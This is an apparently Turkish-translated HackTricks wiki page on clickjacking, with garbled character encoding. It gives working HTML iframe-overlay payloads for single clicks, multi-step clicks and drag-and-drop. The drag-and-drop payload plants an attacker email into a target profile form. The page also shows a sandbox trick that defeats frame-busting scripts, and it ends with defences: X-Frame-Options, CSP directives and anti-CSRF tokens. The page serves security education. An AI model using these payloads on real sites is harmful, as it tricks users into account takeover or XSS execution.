# Clickjacking

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=clickjacking) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=clickjacking" %}

## Clickjacking Nedir

Bir clickjacking saldÄ±rÄ±sÄ±nda, bir **kullanÄ±cÄ±**, bir web sayfasÄ±ndaki **gÃ¶rÃ¼nmez** veya farklÄ± bir Ã¶ÄŸe olarak gizlenmiÅŸ bir **Ã¶ÄŸe** Ã¼zerine **tÄ±klamaya** **kandÄ±rÄ±lÄ±r**. Bu manipÃ¼lasyon, kullanÄ±cÄ±nÄ±n istemeden kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±m indirmesi, kÃ¶tÃ¼ niyetli web sayfalarÄ±na yÃ¶nlendirilmesi, kimlik bilgileri veya hassas bilgilerin saÄŸlanmasÄ±, para transferleri veya Ã¼rÃ¼nlerin Ã§evrimiÃ§i satÄ±n alÄ±nmasÄ± gibi istenmeyen sonuÃ§lara yol aÃ§abilir.

### FormlarÄ± Ã–nceden Doldurma Hilesi

Bazen bir sayfa yÃ¼klenirken **GET parametrelerini kullanarak bir formun alanlarÄ±nÄ±n deÄŸerini doldurmak** mÃ¼mkÃ¼ndÃ¼r. Bir saldÄ±rgan, bu davranÄ±ÅŸÄ± kÃ¶tÃ¼ye kullanarak bir formu rastgele verilerle doldurabilir ve kullanÄ±cÄ±nÄ±n GÃ¶nder butonuna basmasÄ± iÃ§in clickjacking yÃ¼kÃ¼nÃ¼ gÃ¶nderebilir.

### SÃ¼rÃ¼kle ve BÄ±rak ile Form Doldurma

KullanÄ±cÄ±nÄ±n bir **formu doldurmasÄ±nÄ±** istiyorsanÄ±z ancak ona bazÄ± Ã¶zel bilgileri (bildiÄŸiniz e-posta veya Ã¶zel ÅŸifre gibi) yazmasÄ±nÄ± doÄŸrudan istemek istemiyorsanÄ±z, ona sadece **SÃ¼rÃ¼kle ve BÄ±rak** yapmasÄ±nÄ± isteyebilirsiniz; bu, kontrol ettiÄŸiniz verileri yazacaktÄ±r, [**bu Ã¶rnekteki gibi**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Temel YÃ¼k
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Ã‡ok AÅŸamalÄ± YÃ¼kleme
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### SÃ¼rÃ¼kle\&BÄ±rak + TÄ±kla yÃ¼kÃ¼
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

EÄŸer bir **kullanÄ±cÄ±nÄ±n tÄ±klamasÄ±nÄ± gerektiren bir XSS saldÄ±rÄ±sÄ±** tespit ettiyseniz ve sayfa **clickjacking'e karÅŸÄ± savunmasÄ±zsa**, kullanÄ±cÄ±yÄ± butona/baÄŸlantÄ±ya tÄ±klamaya kandÄ±rmak iÃ§in bunu kÃ¶tÃ¼ye kullanabilirsiniz.\
Ã–rnek:\
_HesabÄ±n bazÄ± Ã¶zel detaylarÄ±nda bir **self XSS** buldunuz (bu detaylarÄ± **sadece siz ayarlayabilir ve okuyabilirsiniz**). Bu detaylarÄ± ayarlamak iÃ§in kullanÄ±lan **formun** bulunduÄŸu sayfa **Clickjacking'e karÅŸÄ± savunmasÄ±z** ve **formu** GET parametreleri ile **Ã¶nceden doldurabilirsiniz**._\
\_\_Bir saldÄ±rgan, **formu** **XSS yÃ¼kÃ¼** ile **Ã¶nceden doldurarak** o sayfaya bir **Clickjacking** saldÄ±rÄ±sÄ± hazÄ±rlayabilir ve **kullanÄ±cÄ±yÄ±** formu **gÃ¶ndermeye** **kandÄ±rabilir**. BÃ¶ylece, **form gÃ¶nderildiÄŸinde** ve deÄŸerler deÄŸiÅŸtirildiÄŸinde, **kullanÄ±cÄ± XSS'i Ã§alÄ±ÅŸtÄ±racaktÄ±r**.

## Clickjacking'i Azaltma Stratejileri

### Ä°stemci TarafÄ± SavunmalarÄ±

Ä°stemci tarafÄ±nda yÃ¼rÃ¼tÃ¼len betikler, Clickjacking'i Ã¶nlemek iÃ§in eylemler gerÃ§ekleÅŸtirebilir:

* Uygulama penceresinin ana veya Ã¼st pencere olduÄŸundan emin olmak.
* TÃ¼m Ã§erÃ§evelerin gÃ¶rÃ¼nÃ¼r olmasÄ±nÄ± saÄŸlamak.
* GÃ¶rÃ¼nmez Ã§erÃ§evelere tÄ±klamayÄ± Ã¶nlemek.
* KullanÄ±cÄ±larÄ± potansiyel Clickjacking giriÅŸimlerine karÅŸÄ± tespit etmek ve uyarmak.

Ancak, bu Ã§erÃ§eve kÄ±rÄ±cÄ± betikler aÅŸÄ±labilir:

* **TarayÄ±cÄ±larÄ±n GÃ¼venlik AyarlarÄ±:** BazÄ± tarayÄ±cÄ±lar, gÃ¼venlik ayarlarÄ±na veya JavaScript desteÄŸinin eksikliÄŸine baÄŸlÄ± olarak bu betikleri engelleyebilir.
* **HTML5 iframe `sandbox` Ã–zelliÄŸi:** Bir saldÄ±rgan, `allow-forms` veya `allow-scripts` deÄŸerleri ile `sandbox` Ã¶zelliÄŸini ayarlayarak Ã§erÃ§eve kÄ±rÄ±cÄ± betikleri etkisiz hale getirebilir, `allow-top-navigation` olmadan. Bu, iframe'in Ã¼st pencere olup olmadÄ±ÄŸÄ±nÄ± doÄŸrulamasÄ±nÄ± engeller, Ã¶rneÄŸin,
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
The `allow-forms` ve `allow-scripts` deÄŸerleri, iframe iÃ§inde eylemleri etkinleÅŸtirirken Ã¼st dÃ¼zey navigasyonu devre dÄ±ÅŸÄ± bÄ±rakÄ±r. Hedeflenen sitenin beklenen iÅŸlevselliÄŸini saÄŸlamak iÃ§in, saldÄ±rÄ± tÃ¼rÃ¼ne baÄŸlÄ± olarak `allow-same-origin` ve `allow-modals` gibi ek izinler gerekli olabilir. TarayÄ±cÄ± konsol mesajlarÄ±, hangi izinlerin verilmesi gerektiÄŸi konusunda rehberlik edebilir.

### Sunucu TarafÄ± SavunmalarÄ±

#### X-Frame-Options

**`X-Frame-Options` HTTP yanÄ±t baÅŸlÄ±ÄŸÄ±**, tarayÄ±cÄ±lara bir sayfanÄ±n `<frame>` veya `<iframe>` iÃ§inde render edilmesinin meÅŸruiyeti hakkÄ±nda bilgi verir ve Clickjacking'i Ã¶nlemeye yardÄ±mcÄ± olur:

* `X-Frame-Options: deny` - HiÃ§bir alan iÃ§eriÄŸi Ã§erÃ§eveleyemez.
* `X-Frame-Options: sameorigin` - Sadece mevcut site iÃ§eriÄŸi Ã§erÃ§eveleyebilir.
* `X-Frame-Options: allow-from https://trusted.com` - Sadece belirtilen 'uri' sayfayÄ± Ã§erÃ§eveleyebilir.
* SÄ±nÄ±rlamalarÄ± not edin: tarayÄ±cÄ± bu yÃ¶nergeyi desteklemiyorsa, Ã§alÄ±ÅŸmayabilir. BazÄ± tarayÄ±cÄ±lar CSP frame-ancestors yÃ¶nergesini tercih eder.

#### Ä°Ã§erik GÃ¼venlik PolitikasÄ± (CSP) frame-ancestors yÃ¶nergesi

**CSP'deki `frame-ancestors` yÃ¶nergesi**, Clickjacking korumasÄ± iÃ§in Ã¶nerilen yÃ¶ntemdir:

* `frame-ancestors 'none'` - `X-Frame-Options: deny` ile benzer.
* `frame-ancestors 'self'` - `X-Frame-Options: sameorigin` ile benzer.
* `frame-ancestors trusted.com` - `X-Frame-Options: allow-from` ile benzer.

Ã–rneÄŸin, aÅŸaÄŸÄ±daki CSP yalnÄ±zca aynÄ± alan adÄ±ndan Ã§erÃ§evelemeye izin verir:

`Content-Security-Policy: frame-ancestors 'self';`

Daha fazla ayrÄ±ntÄ± ve karmaÅŸÄ±k Ã¶rnekler iÃ§in [frame-ancestors CSP belgelerine](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) ve [Mozilla'nÄ±n CSP frame-ancestors belgelerine](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors) bakabilirsiniz.

### Ä°Ã§erik GÃ¼venlik PolitikasÄ± (CSP) ile `child-src` ve `frame-src`

**Ä°Ã§erik GÃ¼venlik PolitikasÄ± (CSP)**, tarayÄ±cÄ±nÄ±n hangi kaynaklarÄ±n iÃ§erik yÃ¼klemesine izin vereceÄŸini belirleyerek Clickjacking ve diÄŸer kod enjeksiyon saldÄ±rÄ±larÄ±nÄ± Ã¶nlemeye yardÄ±mcÄ± olan bir gÃ¼venlik Ã¶nlemidir.

#### `frame-src` YÃ¶nergesi

* Ã‡erÃ§eveler iÃ§in geÃ§erli kaynaklarÄ± tanÄ±mlar.
* `default-src` yÃ¶nergesinden daha spesifiktir.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Bu politika, aynÄ± kÃ¶kten (self) ve https://trusted-website.com adresinden Ã§erÃ§evelere izin verir.

#### `child-src` YÃ¶nergesi

* Web iÅŸÃ§ileri ve Ã§erÃ§eveler iÃ§in geÃ§erli kaynaklarÄ± belirlemek Ã¼zere CSP seviye 2'de tanÄ±tÄ±lmÄ±ÅŸtÄ±r.
* frame-src ve worker-src iÃ§in bir yedek olarak iÅŸlev gÃ¶rÃ¼r.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Bu politika, aynÄ± kÃ¶kenden (self) ve https://trusted-website.com adresinden gelen Ã§erÃ§evelere ve iÅŸÃ§ilere izin verir.

**KullanÄ±m NotlarÄ±:**

* KullanÄ±mdan KaldÄ±rma: child-src, frame-src ve worker-src lehine aÅŸamalÄ± olarak kaldÄ±rÄ±lmaktadÄ±r.
* Yedek DavranÄ±ÅŸ: EÄŸer frame-src yoksa, child-src Ã§erÃ§eveler iÃ§in yedek olarak kullanÄ±lÄ±r. Her ikisi de yoksa, default-src kullanÄ±lÄ±r.
* SÄ±kÄ± Kaynak TanÄ±mÄ±: SÃ¶mÃ¼rÃ¼yÃ¼ Ã¶nlemek iÃ§in direktiflerde yalnÄ±zca gÃ¼venilir kaynaklar dahil edilmelidir.

#### JavaScript Ã‡erÃ§eve KÄ±rma Scriptleri

Tamamen gÃ¼venilir olmasa da, JavaScript tabanlÄ± Ã§erÃ§eve kÄ±rma scriptleri, bir web sayfasÄ±nÄ±n Ã§erÃ§evelenmesini Ã¶nlemek iÃ§in kullanÄ±labilir. Ã–rnek:
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### Anti-CSRF TokenlarÄ±nÄ±n KullanÄ±mÄ±

* **Token DoÄŸrulama:** Web uygulamalarÄ±nda anti-CSRF tokenlarÄ± kullanarak, durum deÄŸiÅŸtiren isteklerin kullanÄ±cÄ±nÄ±n isteÄŸiyle ve Clickjacked bir sayfa aracÄ±lÄ±ÄŸÄ±yla deÄŸil, kasÄ±tlÄ± olarak yapÄ±ldÄ±ÄŸÄ±ndan emin olun.

## Referanslar

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=clickjacking) kullanarak dÃ¼nyanÄ±n **en geliÅŸmiÅŸ** topluluk araÃ§larÄ±yla desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ±** kolayca oluÅŸturun ve **otomatikleÅŸtirin**.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=clickjacking" %}

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
